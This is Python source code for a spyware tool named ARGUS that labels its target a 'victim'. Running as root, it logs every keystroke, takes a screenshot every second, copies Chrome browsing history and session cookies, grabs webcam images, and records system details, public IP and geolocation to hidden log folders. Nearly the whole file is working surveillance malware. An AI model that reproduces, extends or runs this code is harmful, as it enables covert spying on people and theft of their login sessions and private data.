import time
import os
import threading 
import sys
import platform
import sqlite3
import psutil
import socket
import requests
import urllib.request
import json
from pynput.keyboard import Listener
from threading import Timer, Thread
from mss import mss
import ecapture as ec



BLUE, RED, WHITE, YELLOW, GREEN, CYAN, MAGENTA, =('\033[1;34;40m', '\033[1;31;40m', '\033[1;37;40m', '\033[1;33;40m', '\033[1;32;40m', '\033[1;36;40m', '\033[1;35;40m')


if os.getuid() != 0:
    sys.exit( RED + '\nError : ARGUS Must Be Run As root\n\nExiting...\n ' + WHITE)


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)




class logger:

    def _on_press(self, k):
        with open('./logs/keylogs/logs.txt', 'a') as f:
            f.write(' Victim Pressed : {}\t\t{}\n'.format(k, time.ctime()))


    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/sysinfo')
            os.mkdir('./logs/keylogs')
            os.mkdir('./logs/chrome')
            os.mkdir('./logs/chrome/history')
            os.mkdir('./logs/chrome/cookies')
            os.mkdir('./logs/webcam')



    def sysinfo(self):

        #get system info
        getsysinfo = {'getuname':os.uname(),'getlogin':os.getlogin(),'getpid':os.getpid(),'getenv':os.getenv('HOME'),'datetime':time.ctime(time.time())}

        private_ip = socket.gethostbyname(socket.gethostname())

        public_ip = requests.get('http://ip.42.pl/raw').text

        #getlocation
        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            data = json.loads(url.read().decode())
            

        combined = f"""[+++] Argus Started At {getsysinfo['datetime']} [+++] [+++] Victim Sysinfo : {getsysinfo['getuname']} [+++]
        [+++] User : {getsysinfo['getlogin']} [+++] [+++] Home Environment : {getsysinfo['getenv']} [+++] [+++] Public IP Address : {public_ip} [+++] [+++] Private IP Address : {private_ip} [+++] [+++] Location : {data} [+++]   """


        repr(combined)
        f = open(f'./logs/sysinfo/{time.time()}.txt', 'w')
        f.write(repr(combined) + '\n')
        f.close()


    


        #Chrome
    def dump_history(self):


        # dump Chrome History I suuggest Keep The try and except Block For Chrome As It Requires Killing The Process And This could be danger if you doing it for real!
        try:
            con = sqlite3.connect(os.getenv("HOME") + "/Library/ApplicationSupport/Google/Chrome/Default/History")
            cur = con.cursor()
            output_file = open(r'' + f'./logs/chrome/history/{time.time()}.txt', 'a')
            cur.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cur.fetchall():
                output_file.write("Website: %s \n\t Title: %s \n\t Last Visited: %s \n\n" % (
                u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),
                u''.join(str(row[2])).encode('utf-8').strip()))
            output_file.close()

        except Exception:
            pass



            #Chrome
    def dump_cookies(self):


        #dump Chrome Cookies I suuggest Keep The try and except Block For Chrome As It Requires Killing The Process And This could be danger if you doing it for real!
        try:
            con = sqlite3.connect(os.getenv("HOME") + "/Library/ApplicationSupport/Google/Chrome/Default/Cookies")
            cur = con.cursor()
            output_file = open(r'' + f'./logs/chrome/cookies/{time.time()}.txt', 'a')
            cur.execute('SELECT host_key, name, value FROM Cookies')
            for row in cur.fetchall():


                output_file.write("Hostname: %s \n\t Name: %s \n\t Value: %s \n\n" % (u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),u''.join(row[2]).strip()))
            output_file.close()

        except Exception:
            pass






    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):

        
        sct = mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))






    def webcam(self): #Webcam Shoot
        
        try:

    
            ec.capture(0,False,f"./logs/webcam{time.time()}.jpg")
        
        
        except Exception: 
            pass

                    #Time Interval in seconds!
    def run(self, interval=1):
        
        self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()
        IntervalTimer(interval, self.dump_history).start()
        IntervalTimer(interval, self.dump_cookies).start()



if __name__ == '__main__':
    log = logger()
    log.run()
    log.sysinfo()